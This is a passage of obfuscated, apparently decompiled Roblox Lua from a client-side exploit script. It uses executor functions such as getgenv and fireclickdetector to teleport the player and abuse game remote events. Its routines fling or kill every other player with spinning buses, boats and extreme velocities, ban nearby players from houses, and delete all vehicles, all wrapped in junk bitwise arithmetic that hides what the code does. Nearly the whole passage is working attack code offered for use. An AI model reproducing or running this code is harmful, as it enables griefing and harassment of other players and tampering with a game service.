		end)
	end)
end

-- payload closure created 844-th (proto #542)
local function payload_fn_844()
	local v = upv1 or upv2 or upv3 or upv4 or upv5

	if upv6 then
		upv6:Disconnect()
		upv6 = nil
	end

	local character = upv7.Character

	if character then
		local humanoid = character:FindFirstChildOfClass("Humanoid")

		if humanoid then
			local flag = not v
			humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, flag)

			if v then
				local n2 = 465455759


				local n3 = n2 + 128678402

				if humanoid.Sit then
					humanoid.Sit = false
				end

				local n4 = n3 - 80364211

				upv6 = humanoid:GetPropertyChangedSignal("Sit"):Connect(function()
					local sit = humanoid.Sit

					if sit then
						sit = upv1 or upv2 or upv3 or upv4 or upv5
					end

					if sit then
						humanoid.Sit = false
					end
				end)
			end
		end
	end
end

-- payload closure created 845-th (proto #781)
local function payload_fn_845(arg)
	local humanoid = arg:WaitForChild("Humanoid", 5)

	if humanoid then
		local v = upv1 or upv2 or upv3 or upv4 or upv5
		humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, not v)

		if upv6 then
			upv6:Disconnect()
			upv6 = nil
		end

		if v then
			local n2 = 8939448191

			upv6 = humanoid:GetPropertyChangedSignal("Sit"):Connect(function()
				local sit = humanoid.Sit
				local v2

				if sit then
					v2 = upv1 or upv2 or upv3 or upv4 or upv5
				else
					v2 = sit
				end

				if v2 then
					humanoid.Sit = false
				end
			end)
		end
	end
end

-- payload closure created 846-th (proto #541)
local function payload_fn_846()
	upv1()
end

-- payload closure created 848-th (proto #543)
local function payload_fn_848()
	local n2 = 288796773
	local Players = game:GetService("Players")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Workspace = game:GetService("Workspace")
	local v = table.pack(bit32.band(n2, 4294967295))
	local v2 = table.pack(bit32.band(v[1], 65535))
	local v3 = bit32.band(60301 * v2[1] + bit32.lshift(bit32.band(60301 * bit32.rshift(v[1], 16) + 56585 * v2[1], 65535), 16), 4294967295)
	local StarterGui = game:GetService("StarterGui")
	local localPlayer = Players.LocalPlayer
	local n3 = 93733336
	local character = localPlayer.Character
	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
	local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
	local n001Lots = Workspace:FindFirstChild("001_Lots")
	local vehicles = Workspace:FindFirstChild("Vehicles")


	if not upv1 then
		return
	end

	local function fn()
		for _, child in pairs(n001Lots:GetChildren()) do
			if child.Name == "For Sale" and not child:FindFirstChild("HousePickedByPlayer") then
				for _, descendant in pairs(child:GetDescendants()) do
					if descendant:IsA("NumberValue") and descendant.Name == "Number" then
						local value = descendant.Value
						if value >= 11 and value <= 24 then
							return child, value
						end
					end
				end
			end
		end

		return nil, nil
	end

	local function fn2(arg, arg2, arg3, arg4)
		local buyHouse = arg2:FindFirstChild("BuyHouse")
		local n4 = 77967215

		if buyHouse and buyHouse:IsA("BasePart") and humanoidRootPart then
			humanoidRootPart.CFrame = buyHouse.CFrame + Vector3.new(0, -6, 0)
			task.wait(0.5)
			local clickDetector = buyHouse:FindFirstChild("ClickDetector")

			if clickDetector and fireclickdetector then
				local v4 = pcall
				local v5 = table.pack(bit32.band(arg, 4294967295))
				local v6 = table.pack(bit32.band(v5[1], 65535))
				local v7 = bit32.band(40098 * v6[1] + bit32.lshift(bit32.band(40098 * bit32.rshift(v5[1], 16) + 56499 * v6[1], 65535), 16), 4294967295)
				local v8 = table.pack(bit32.band(bit32.bnot(arg), 4294967295))
				local v9 = table.pack(bit32.band(v8[1], 65535))
				local n5 = 4467433203 + v7 + bit32.band(40098 * v9[1] + bit32.lshift(bit32.band(40098 * bit32.rshift(v8[1], 16) + 56499 * v9[1], 65535), 16), 4294967295)

				v4(function()
					fireclickdetector(clickDetector)
				end)
			end

			task.wait(0.5)
		end

		pcall(function()
			ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Lot:BuildProperty"):InvokeServer(arg4, "052_House")
		end)
	end

	local function fn3()
		StarterGui:SetCore("SendNotification", { Title = "House Ban", Text = "Aguardando a casa ficar pronta...", Duration = 3 })
		local now = tick()

		while true do
			task.wait(0.2)
			if not (n001Lots:FindFirstChild(localPlayer.Name .. "House") or tick() - now > 10) then
				continue
			end
			break
		end

		task.wait(0.5)
	end

	local function fn4()
		local v4 = n001Lots:FindFirstChild(localPlayer.Name .. "House")

		if v4 then
			local v5 = nil

			for _, descendant in pairs(v4:GetDescendants()) do
				if descendant:IsA("NumberValue") and descendant.Name == "Number" then
					v5 = descendant
					break
				else
					v5 = nil
				end
			end

			if v5 then
				ReplicatedStorage.RE["1Gettin1gHous1e"]:FireServer("PickingCustomHouse", "049_House", v5.Value)
			end
		end
	end

	local function fn5()
		return vehicles:FindFirstChild(localPlayer.Name .. "Car")
	end

	local function fn6()
		humanoidRootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
		task.wait(0.5)
		ReplicatedStorage.RE["1Ca1r"]:FireServer("PickingCar", "SchoolBus")
		task.wait(0.5)
	end

	local function fn7(arg)
		local v4 = fn5(arg, 108478446)

		if v4 and not humanoid.Sit then
			local seats = v4:FindFirstChild("Seats")
			seats = seats and seats:FindFirstChild("VehicleSeat")

			if seats then
				repeat
					humanoidRootPart.CFrame = seats.CFrame * CFrame.new(0, math.random(-1, 1), 0)
					task.wait()
				until humanoid.Sit
			end
		end
	end

	local function fn8(arg, arg2, arg3, arg4)
		local v4 = fn5(arg2, 108478446)

		while arg4 and not arg4.Sit do
			task.wait()
			local distributedGameTime = Workspace.DistributedGameTime

			if v4 and v4.PrimaryPart then
				local cframe = CFrame.Angles
				v4:SetPrimaryPartCFrame(CFrame.new(arg3.Position) * cframe(math.rad(distributedGameTime * 12000), math.rad(distributedGameTime * 15000), math.rad(distributedGameTime * 18000)))
			end
		end
	end

	local function fn9(arg, arg2)
		local n4 = 318414673
		local v4 = n001Lots:FindFirstChild(localPlayer.Name .. "House")

		if v4 then
			local houseModel = v4:FindFirstChild("HousePickedByPlayer") and v4.HousePickedByPlayer:FindFirstChild("HouseModel")
			houseModel = houseModel and houseModel:FindFirstChild("Permissions:Disallow")
			local v5 = Workspace:FindPartsInRegion3(Region3.new(humanoidRootPart.Position - Vector3.new(60, 60, 60), humanoidRootPart.Position + Vector3.new(60, 60, 60)), humanoidRootPart, math.huge)
			local band = bit32.band
			local v6 = bit32.bxor(arg2, 0)
			local v7 = band(n4, v6)

			for _, v8 in pairs(v5) do
				if v8.Name == "HumanoidRootPart" then
					local v9 = Players:FindFirstChild(v8.Parent.Name)

					if v9 and v9 ~= localPlayer and houseModel then
						houseModel:FireServer(v9)
					end
				end
			end

		end
	end

	local v4 = Players:FindFirstChild(upv1)

	if v4 and v4.Character then
		if not n001Lots:FindFirstChild(localPlayer.Name .. "House") then
			local v5, v6 = fn(427868904, 297498728)
			if not (v5 and v6) then
				return
			end
			fn2(349002919, v5, 13676288, v6)
			fn3(443666794, 290650628)
		end

		fn4(169812854, 213499034)
		task.wait(0.5)
		local n4 = n2 - 1274141774

		if not fn5(415612139, 108478446) then
			fn6(346990869, 215325296)
			task.wait(0.5)
			fn7(360912129, 14068830)
		end

		task.wait(0.5)

		if fn5(122901285, 108478446) and not humanoid.Sit then
			local v5 = bit32.bxor(v3, 4294967295)
			fn7(370140179, 14068830)
		end

		local character2 = v4.Character
		local humanoidRootPart2 = character2:FindFirstChild("HumanoidRootPart")
		local humanoid2 = character2:FindFirstChildOfClass("Humanoid")

		if humanoidRootPart2 and humanoid2 then
			fn8(311149885, 140492175, humanoidRootPart2, humanoid2)
			task.wait(0.5)
			local v5 = n001Lots:FindFirstChild(localPlayer.Name .. "House")
			local v6 = fn5(197726843, 108478446)

			if v5 and v6 then
				v6:SetPrimaryPartCFrame(CFrame.new(v5.HouseSpawnPosition.Position))
			end

			task.wait(0.5)
			fn9(220566800, 433919512)
			task.wait(0.2)
			ReplicatedStorage.RE["1Ca1r"]:FireServer("DeleteAllVehicles")
		end

	end
end

-- payload closure created 849-th (proto #544)
local function payload_fn_849(arg)
	local n2 = 287539424
	local n3 = 970313721
	local v = upv1

	if not v or v == "" then
		if Toggle1.Set then
			Toggle1:Set(false)
		end

		return
	end

	local localPlayer = game.Players.LocalPlayer
	local character = localPlayer.Character

	if not character then
		character = localPlayer.CharacterAdded:Wait()
		n2 = bit32.bxor(n2 // 93, 286043533)
	end

	local humanoid = character:WaitForChild("Humanoid")
	local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
	upv2 = humanoidRootPart.CFrame

	if arg then
		local n4 = 41455633
		local airVehicleSpawner = workspace:FindFirstChild("AirVehicleSpawner")
		if not airVehicleSpawner or not airVehicleSpawner:FindFirstChild("Button") then
			warn("Spawner ou botão do helicóptero não encontrado.")
			return
		end
		local button = airVehicleSpawner.Button
		local cFrame = button.CFrame + Vector3.new(0, 3, 0)
		local v2 = table.pack(bit32.band(n4, 4294967295))
		local v3 = table.pack(bit32.band(v2[1], 65535))
		local n5 = bit32.band(25485 * v3[1] + bit32.lshift(bit32.band(25485 * bit32.rshift(v2[1], 16) + 2960 * v3[1], 65535), 16), 4294967295) + 1843200303
		local v4 = table.pack(bit32.band(bit32.bor(n4, 358812331), 4294967295))
		local v5 = table.pack(bit32.band(v4[1], 65535))
		local v6 = bit32.band(40052 * v5[1] + bit32.lshift(bit32.band(40052 * bit32.rshift(v4[1], 16) + 62575 * v5[1], 65535), 16), 4294967295)
		local v7 = table.pack(bit32.band(bit32.band(n4, 358812331), 4294967295))
		local v8 = table.pack(bit32.band(v7[1], 65535))
		local n6 = n5 + v6 + bit32.band(40050 * v8[1] + bit32.lshift(bit32.band(40050 * bit32.rshift(v7[1], 16) + 62575 * v8[1], 65535), 16), 4294967295)
		humanoidRootPart.CFrame = cFrame
		task.wait(0.4)
		local clickDetector = button:FindFirstChildOfClass("ClickDetector")
		if not clickDetector then
			return
		end
		fireclickdetector(clickDetector)
		local n7 = n3 - n2
		task.wait(1)
		local spawnVehicle = workspace:WaitForChild("AirVehicleSpawner"):FindFirstChild("SpawnVehicle")
		if not spawnVehicle then
			return
		end
		spawnVehicle:InvokeServer(unpack({ "HelicopterPolice" }))
		local helicopters = workspace:WaitForChild("Helicopters")
		local helicopterPolice = nil

		for i = 1, 60 do
			helicopterPolice = helicopters:FindFirstChild("HelicopterPolice")
			if not (helicopterPolice and helicopterPolice:FindFirstChild("hEL")) then
				task.wait(0.2)
				continue
			end
			break
		end

		if not helicopterPolice then
			return
		end
		local pilotSeat = helicopterPolice:FindFirstChild("PilotSeat") or helicopterPolice:FindFirstChild("VehicleSeat")
		if not pilotSeat then
			return
		end

		if not helicopterPolice.PrimaryPart then
			helicopterPolice.PrimaryPart = pilotSeat
		end

		local n8 = 0

		while true do
			character:MoveTo(pilotSeat.Position + Vector3.new(0, 3, 0))
			task.wait(0.05)
			pilotSeat:Sit(humanoid)
			n8 += 1
			if not (humanoid.Sit or n8 > 120) then
				continue
			end
			break
		end

		if not humanoid.Sit then
			return
		end
		local n9 = n2 + 3577950503
		upv3 = Instance.new("BodyPosition", helicopterPolice.PrimaryPart)
		upv3.MaxForce = Vector3.new(1e9, 1e9, 1e9)
		upv3.P = 100000
		upv3.D = 1000
		local v9 = game.Players:FindFirstChild(v)
		if not v9 then
			return
		end
		local character2 = v9.Character or v9.CharacterAdded:Wait()
		local humanoidRootPart2 = character2:WaitForChild("HumanoidRootPart")
		local humanoid2 = character2:WaitForChild("Humanoid")
		local heartbeat = game:GetService("RunService").Heartbeat
		local v10 = bit32.bxor(n7, 4294967295)

		local function fn()
			if not character2 or not humanoid2 or humanoid2.Health <= 0 then
				if upv4 then
					upv4:Disconnect()
					upv4 = nil
				end

				if upv3 then
					upv3:Destroy()
					upv3 = nil
				end

				return
			end

			upv3.Position = humanoidRootPart2.Position + Vector3.new(0, 6, 0)
		end

		upv4 = heartbeat:Connect(fn)
	else
		if upv4 then
			upv4:Disconnect()
			upv4 = nil
		end

		if upv3 then
			upv3:Destroy()
			upv3 = nil
		end

		humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
		task.wait(0.2)
		humanoidRootPart.CFrame = upv2
	end
end

-- payload closure created 850-th (proto #548)
local function payload_fn_850(arg, arg2)
	local n2 = 454133361

	pcall(function()
		upv1:SetCore("SendNotification", { Title = arg, Text = arg2 or "", Duration = 5 })
	end)
end

-- payload closure created 851-th (proto #546)
local function payload_fn_851()
	local n2 = 3045586246
	local n3 = 3801334110
	local character = upv1.Character
	if not character then
		return nil
	end
	local backpack = upv1:WaitForChild("Backpack")
	local workspaceCom = workspace:FindFirstChild("WorkspaceCom")
	if not workspaceCom then
		return nil
	end
	local n001SoccerBalls = workspaceCom:FindFirstChild("001_SoccerBalls")
	if not n001SoccerBalls then
		return nil
	end
	local str = "Soccer" .. upv1.Name
	local v = n001SoccerBalls:FindFirstChild(str)

	if not v then
		local n4 = 393475279
		local flag = not backpack:FindFirstChild("SoccerBall")

		if flag then
			flag = not character:FindFirstChild("SoccerBall")
			bit32.bxor(bit32.bxor(n2, 1369198681), 1369198681)
		end

		if flag then
			local n5 = 508861480

			pcall(function()
				upv2:WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer("PickingTools", "SoccerBall")
			end)
		end

		local v2 = tick
		local v3 = bit32.bxor(n4, 363132270)
		local v4 = v2()
		local soccerBall_ = backpack:FindFirstChild("SoccerBall") or character:FindFirstChild("SoccerBall")

		while not soccerBall_ and tick() - v4 < 3 do
			task.wait(0.05)
			soccerBall_ = backpack:FindFirstChild("SoccerBall") or character:FindFirstChild("SoccerBall")
		end

		if not soccerBall_ then
			return nil
		end
		soccerBall_.Parent = character
		task.wait(0.1)

		pcall(function()
			if soccerBall_:FindFirstChild("FootballInteraction") then
				soccerBall_.FootballInteraction:FireServer(CFrame.new(character:FindFirstChild("HumanoidRootPart") and character.HumanoidRootPart.Position or Vector3.zero))
			end
		end)

		local now = tick()

		while not n001SoccerBalls:FindFirstChild(str) and tick() - now < 3 do
			task.wait(0.05)
		end

		if character:FindFirstChild("SoccerBall") then
			character.SoccerBall.Parent = backpack
		end

		v = n001SoccerBalls:FindFirstChild(str)
	end

	return v
end

-- payload closure created 852-th (proto #t2284)
local function payload_fn_852(part0)
	local character = upv1.Character
	if not part0 or not part0:IsA("BasePart") or not character then
		return
	end

	for _, child in ipairs(part0:GetChildren()) do
		if child:IsA("NoCollisionConstraint") and child.Name == "CoquetteLocalNoCollision" then
			child:Destroy()
		end
	end

	for _, descendant in ipairs(character:GetDescendants()) do
		if descendant:IsA("BasePart") then
			local noCollisionConstraint = Instance.new("NoCollisionConstraint")
			noCollisionConstraint.Name = "CoquetteLocalNoCollision"
			noCollisionConstraint.Part0 = part0
			noCollisionConstraint.Part1 = descendant
			noCollisionConstraint.Parent = part0
		end
	end
end

-- payload closure created 853-th (proto #545)
local function payload_fn_853()
end

-- payload closure created 854-th (proto #t6852)
local function payload_fn_854(arg)
	if not arg then
		allFling2 = false

		if upv1 and upv1.Parent then
			local n2 = 316100827

			pcall(function()
				upv1:Destroy()
			end)
		end

		upv1 = nil
		return
	end
end

-- payload closure created 855-th (proto #t4077)
local function payload_fn_855()
	upv1(not allFling2)
end

-- payload closure created 856-th (proto #547)
local function payload_fn_856()
	orbitando = false
	allFling2 = false

	if upv1 and upv1.Parent then
		local flag = type(0) == "vector"
		local n2 = 4675968646

		pcall(function()
			upv1:Destroy()
		end)
	end

	upv1 = nil
	orbitConn:Disconnect()
	orbitConn = nil
	allConn2:Disconnect()
	allConn2 = nil
	soccerBall.Anchored = originalProperties.Anchored
	soccerBall.CanCollide = originalProperties.CanCollide
	soccerBall.CanTouch = originalProperties.CanTouch
	soccerBall = nil
	upv2("Parou", "Orbitando foi desativado.")
end

-- payload closure created 858-th (proto #t3694)
local function payload_fn_858(arg)
	local n2 = 374586736
	local n3 = 1946479787
	local n4 = 3311991910
	local n5 = 1579953809

	if not arg then
		getgenv().CoquetteKillBusAllActive = false

		pcall(function()
			game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer("DeleteAllVehicles")
		end)

		return
	end

	local n6 = n2 + 27114035
	local n7 = n5 // 7
	getgenv().CoquetteKillBusAllActive = true
	local Players = game:GetService("Players")
	local Workspace = game:GetService("Workspace")
	local RunService = game:GetService("RunService")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local localPlayer = Players.LocalPlayer
	local vehicles = Workspace:FindFirstChild("Vehicles")
	local humanoidRootPart = localPlayer.Character and localPlayer.Character:WaitForChild("HumanoidRootPart")
	local character = localPlayer.Character
	local n8 = n6 + 114958118
	local humanoid = character and localPlayer.Character:FindFirstChildOfClass("Humanoid")
	local cFrame = humanoidRootPart and humanoidRootPart.CFrame

	local function fn()
		return vehicles and vehicles:FindFirstChild(localPlayer.Name .. "Car")
	end

	local function fn2()
		if humanoidRootPart then
			humanoidRootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
			task.wait(0.5)
			ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack({ "PickingCar", "SchoolBus" }))
			task.wait(1)
		end
	end

	local v = bit32.band(n4, n7)

	local function fn3(arg2)
		local v2 = bit32.bxor(v, 3810274581)
		local v3 = fn(arg2, 374440882)

		if v3 and humanoid and not humanoid.Sit then
			local now = tick()

			while true do
				local vehicleSeat = v3:FindFirstChildWhichIsA("VehicleSeat", true) or v3:FindFirstChildWhichIsA("Seat", true)
				local flag

				if vehicleSeat then
					if not (humanoid.SeatPart and humanoid.SeatPart:IsDescendantOf(v3)) then
						local flag2 = bit32.bxor(v2, 331537015) == 126429524
						humanoid.Sit = false
						local n9 = 4804081897
						humanoidRootPart.CFrame = vehicleSeat.CFrame * CFrame.new(0, 2, 0)
						task.wait()

						pcall(function()
							vehicleSeat:Sit(humanoid)
						end)
					end

					if not (humanoid.Sit and humanoid.SeatPart and humanoid.SeatPart:IsDescendantOf(v3)) then
						task.wait(0.1)
						flag = not v3.Parent or tick() - now > 10
						if not flag then
							continue
						end
					end
				else
					task.wait(0.1)
					flag = not v3.Parent or tick() - now > 10
					if not flag then
						continue
					end
				end

				break
			end
		end
	end

	local function fn4(arg2, arg3, arg4)
		local character2 = arg4.Character
		local humanoidRootPart2 = character2 and character2:FindFirstChild("HumanoidRootPart")
		character2 = character2 and character2:FindFirstChildOfClass("Humanoid")

		if humanoidRootPart2 and character2 then
			local v2 = fn(arg3, 374440882)
			local n9 = tick() + 10

			while true do
				if getgenv().CoquetteKillBusAllActive and tick() < n9 then
					if character2.Sit then
						if v2 and v2.PrimaryPart then
							v2:SetPrimaryPartCFrame(CFrame.new(Vector3.new(145.51, -374.09, 21.58)))
							task.wait(0.2)

							if humanoid then
								humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
								task.wait(0.4)
								humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
								task.wait(0.5)
							end

							if humanoidRootPart and cFrame then
								humanoidRootPart.CFrame = cFrame
							end

							task.wait(0.1)
							ReplicatedStorage.RE["1Ca1r"]:FireServer("DeleteAllVehicles")
						end

						break
					else
						if v2 and v2.PrimaryPart then
							local distributedGameTime = Workspace.DistributedGameTime
							local cframe = CFrame.Angles
							v2:SetPrimaryPartCFrame(CFrame.new(humanoidRootPart2.Position) * cframe(math.rad(distributedGameTime * 12000), math.rad(distributedGameTime * 15000), math.rad(distributedGameTime * 18000)))
						end

						RunService.RenderStepped:Wait()
						continue
					end
				end

				break
			end
		end
	end

	local fn5 = nil

	fn5 = function(arg2, arg3, arg4)
		if #arg2 == 0 or not getgenv().CoquetteKillBusAllActive then
			return
		end
		local v2 = table.remove(arg2, 1)
		fn2(arg4, 143273204)
		fn3(arg4, 526629694)
		fn4(377980083, arg4, v2)
		task.wait(0.5)
		fn5(arg2, 214812951, arg4)
	end

	local tbl = {}
	local coquetteAllWhitelist = getgenv().CoquetteAllWhitelist or {}

	for _, player in pairs(Players:GetPlayers()) do
		if player ~= localPlayer and not table.find(coquetteAllWhitelist, player) then
			table.insert(tbl, player)
		end
	end

	fn5(tbl, 214812951, 448856850)
	local genv = getgenv()
	genv.CoquetteKillBusAllActive = false
end

-- payload closure created 859-th (proto #t1545)
local function payload_fn_859()
	local n2 = 3532781211
	getgenv().CoquetteBoatAllActive = true
	local n3 = 731544432
	local Players = game:GetService("Players")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local localPlayer = Players.LocalPlayer
	local v = table.pack(bit32.band(n2, 4294967295))
	local v2 = table.pack(bit32.band(v[1], 65535))
	local v3 = bit32.band(5354 * v2[1] + bit32.lshift(bit32.band(5354 * bit32.rshift(v[1], 16) + 22257 * v2[1], 65535), 16), 4294967295)
	local character = localPlayer.Character
	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
	local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
	local vehicles = workspace:FindFirstChild("Vehicles")
	local cFrame = humanoidRootPart and humanoidRootPart.CFrame
	local v4 = vehicles and vehicles:FindFirstChild(localPlayer.Name .. "Car")
	local v5 = v3

	local function fn(arg)
		local v6 = bit32.bxor(arg, 0)
		local v7 = bit32.bxor(v5, 761216450)

		if humanoidRootPart then
			humanoidRootPart.CFrame = CFrame.new(1754, -2, 58)
			local v8 = task
			local n4 = v7 + 1317568885
			v8.wait(0.4)
			ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack({ "PickingBoat", "MilitaryBoatFree" }))
			task.wait(0.6)
			v4 = vehicles and vehicles:FindFirstChild(localPlayer.Name .. "Car")
			local vehicleSeat = v4 and v4:FindFirstChild("Body") and v4.Body:FindFirstChild("VehicleSeat")

			if vehicleSeat then
				while getgenv().CoquetteBoatAllActive and humanoid and not humanoid.Sit do
					task.wait()
					humanoidRootPart.CFrame = vehicleSeat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
				end
			end

		end
	end

	if not v4 then
		fn(176270595, 70439813)
	end

	if v4 and not humanoid.Sit then
		local body = v4:FindFirstChild("Body")

		if body then
			local body2 = v4.Body
			local v6 = bit32.bxor(n2, 619740814)
			body = body2:FindFirstChild("VehicleSeat")
			n2 = v6 + 3694161542
		end

		if body then
			while getgenv().CoquetteBoatAllActive and humanoid and not humanoid.Sit do
				task.wait()
				humanoidRootPart.CFrame = body.CFrame * CFrame.new(0, math.random(-1, 1), 0)
			end
		end
	end

	local bodyGyro = Instance.new("BodyGyro")
	local n4 = n3 - 106001475
	bodyGyro.Parent = v4.PrimaryPart
	bodyGyro.MaxTorque = Vector3.new(10000000, 10000000, 10000000)
	bodyGyro.P = 10000000

	local function fn2(arg, arg2)
		local now = tick()
		local n5 = 0

		while getgenv().CoquetteBoatAllActive and tick() - now < 1.5 do
			task.wait()
			n5 += 8.7266462599716483
			v4:SetPrimaryPartCFrame(CFrame.new(arg2.Position) * CFrame.Angles(n5, n5, 0))
		end
	end

	local coquetteAllWhitelist = getgenv().CoquetteAllWhitelist or {}

	for _, player in pairs(Players:GetPlayers()) do
		if getgenv().CoquetteBoatAllActive then
			if player ~= localPlayer and not table.find(coquetteAllWhitelist, player) then
				local character2 = player.Character
				character2 = character2 and character2:FindFirstChild("HumanoidRootPart")

				if character2 then
					fn2(229201571, character2, 130263161)
				end
			end

			continue
		end

		break
	end

	bodyGyro:Destroy()

	if humanoid then
		humanoid.Sit = false
		humanoid.Jump = true
	end

	if v4 and v4.PrimaryPart then
		local primaryPart = v4.PrimaryPart
		local v6 = table.pack(bit32.band(n2, 4294967295))
		local v7 = table.pack(bit32.band(v3, 4294967295))
		local v8 = table.pack(bit32.band(v6[1], 65535))
		local v9 = table.pack(bit32.rshift(v6[1], 16))
		local v10 = table.pack(bit32.band(v7[1], 65535))
		local v11 = bit32.band(v8[1] * v10[1] + bit32.lshift(bit32.band(v8[1] * bit32.rshift(v7[1], 16) + v9[1] * v10[1], 65535), 16), 4294967295)
		primaryPart.Anchored = true
		task.wait(0.6)
		v4.PrimaryPart.Anchored = false
	end

	if humanoidRootPart and cFrame then
		humanoidRootPart.CFrame = cFrame
	end

	getgenv().CoquetteBoatAllActive = false
end

-- payload closure created 860-th (proto #551)
local function payload_fn_860()
	local n2 = 498647233
	local flag = type(0) == "string"
	local character = upv1 and upv1.Character
	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
	local v = bit32.bxor(n2, 477133106)
	if not humanoid then
		return false
	end
	local v2 = pcall
	local v3 = table.pack(bit32.band(v, 4294967295))
	local v4 = table.pack(bit32.band(v3[1], 65535))
	local n3 = bit32.band(57452 * v4[1] + bit32.lshift(bit32.band(57452 * bit32.rshift(v3[1], 16) + 5940 * v4[1], 65535), 16), 4294967295) + 3648825716
	local v5 = table.pack(bit32.band(bit32.bor(v, 327237351), 4294967295))
	local v6 = table.pack(bit32.band(v5[1], 65535))
	local v7 = bit32.band(16168 * v6[1] + bit32.lshift(bit32.band(16168 * bit32.rshift(v5[1], 16) + 53654 * v6[1], 65535), 16), 4294967295)
	local v8 = table.pack(bit32.band(bit32.bxor(v, 327237351), 4294967295))
	local v9 = table.pack(bit32.band(v8[1], 65535))
	local n4 = n3 + v7 + bit32.band(57453 * v9[1] + bit32.lshift(bit32.band(57453 * bit32.rshift(v8[1], 16) + 5940 * v9[1], 65535), 16), 4294967295)

	local v10, v11 = v2(function()
		return humanoid:GetAppliedDescription()
	end)

	if not v10 or not v11 then
		return false
	end
	local tbl = {}

	for _, v12 in ipairs({ "Head", "Torso", "LeftArm", "RightArm", "LeftLeg", "RightLeg" }) do
		tbl[tonumber(v11[v12]) or 0] = true
	end

	for _, v12 in ipairs(upv2) do
		if not tbl[v12] then
			return false
		end
	end

	local accessories = v11:GetAccessories(true)
	local tbl2 = {}

	for _, accessory in ipairs(accessories) do
		local num = tonumber(accessory.AssetId)

		if num and upv3[num] then
			tbl2[num] = true
		end
	end

	for k in pairs(upv3) do
		if not tbl2[k] then
			return false
		end
	end

	return true
end

-- payload closure created 861-th (proto #550)
local function payload_fn_861()
	if upv1() then
		return
	end
	local remotes = game:GetService("ReplicatedStorage"):WaitForChild("Remotes")
	remotes:WaitForChild("ChangeCharacterBody"):InvokeServer({ 4637151279, 4637120775, 4637119437, 4637122096, 4637120072, 86498113 })
	task.wait(1)
	remotes:WaitForChild("WearBundle"):InvokeServer(125727153346996)
	task.wait(1)
	remotes:WaitForChild("Wear"):InvokeServer(108869350687832)
	task.wait(1)
	remotes:WaitForChild("Wear"):InvokeServer(120269899597754)
end

-- payload closure created 863-th (proto #555)
local function payload_fn_863(arg)
	return arg:FindFirstChild("HumanoidRootPart") or arg:FindFirstChild("Torso") or arg:FindFirstChild("UpperTorso")
end

-- payload closure created 864-th (proto #553)
local function payload_fn_864(arg)
	walkflinging = arg
	local n2 = 435590264

	task.spawn(function()
		local character = upv1.Character or upv1.CharacterAdded:Wait()
		upv2(character)
		local humanoid = character:FindFirstChildWhichIsA("Humanoid")

		if humanoid then
			humanoid.Died:Connect(function()
				walkflinging = false
				upv3:Set(false)
			end)
		end

		local n3 = 0.1

		while true do
			upv4.Heartbeat:Wait()
			local character2 = upv1.Character
			local v = upv2(character2)

			if character2 and character2.Parent and v and v.Parent then
				local n4 = 422033817

				for _, descendant in ipairs(character2:GetDescendants()) do
					if descendant:IsA("BasePart") then
						descendant.CanCollide = false
					end
				end

				local velocity = v.Velocity
				local v2 = n3
				local v3 = table.pack(bit32.band(v2, 4294967295))
				local v4 = table.pack(bit32.band(v3[1], 65535))
				local v5 = bit32.band(16152 * v4[1] + bit32.lshift(bit32.band(16152 * bit32.rshift(v3[1], 16) + 45263 * v4[1], 65535), 16), 4294967295)
				local v6 = table.pack(bit32.band(bit32.bnot(v2), 4294967295))
				local v7 = table.pack(bit32.band(v6[1], 65535))
				local n5 = 3090108393 + n4 + v5 + bit32.band(16152 * v7[1] + bit32.lshift(bit32.band(16152 * bit32.rshift(v6[1], 16) + 45263 * v7[1], 65535), 16), 4294967295)

				pcall(function()
					v.Velocity = velocity * 10000 + Vector3.new(0, 10000, 0)
				end)

				upv4.RenderStepped:Wait()

				if v and v.Parent then
					pcall(function()
						v.Velocity = velocity
					end)
				end

				upv4.Stepped:Wait()

				if v and v.Parent then
					pcall(function()
						v.Velocity = velocity + Vector3.new(0, n3, 0)
					end)

					n3 *= -1
				end
			end
		end
	end)
end

-- payload closure created 867-th (proto #556)
local function payload_fn_867(arg)
	local n2 = 308257522
	local n3 = 4151237443
	local n4 = 2577215499
	local n5 = 326518359
	local Players = game:GetService("Players")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RunService = game:GetService("RunService")
	local Workspace = game:GetService("Workspace")
	local localPlayer = Players.LocalPlayer
	local character = localPlayer.Character
	local v

	if character then
		v = character
	else
		local result2 = localPlayer.CharacterAdded:Wait()
		n3 = bit32.rshift(n3, 5) + 4021511273
		v = result2
	end

	local humanoid = v:FindFirstChildOfClass("Humanoid")
	local humanoidRootPart = v:FindFirstChild("HumanoidRootPart")
	if not humanoid or not humanoidRootPart then
		return
	end
	local vehicles = Workspace:FindFirstChild("Vehicles")
	if not vehicles then
		return
	end

	if arg then
		_G.TornadoActive = true
		local v2 = bit32.bxor(n5, 497584922)
		local v3 = v2
		_G.TornadoConnections = {}
		local v4 = pcall

		local function fn()
			_G.OriginalPosition = humanoidRootPart.CFrame
			humanoidRootPart.Anchored = true
			humanoidRootPart.CFrame = CFrame.new(1565.37, -3.73, 50.68)
			task.wait(0.2)
			humanoidRootPart.Velocity = Vector3.zero
			humanoidRootPart.RotVelocity = Vector3.zero
			humanoidRootPart.Anchored = false
			humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
		end

		local v5 = bit32.bxor(v3, 0)
		local v6 = table.pack(bit32.band(n4, 4294967295))
